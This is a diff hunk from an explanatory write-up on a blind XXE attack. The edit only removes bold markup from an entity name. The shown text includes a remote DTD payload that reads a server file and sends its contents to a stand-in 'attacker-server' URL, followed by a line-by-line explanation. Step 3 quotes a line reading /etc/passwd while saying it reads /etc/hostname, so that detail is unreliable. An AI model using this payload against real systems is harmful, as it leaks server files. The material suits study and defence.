@@ -97,7 +97,7 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, <b>%file></b>, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
+3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity <b>%ent</b> whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
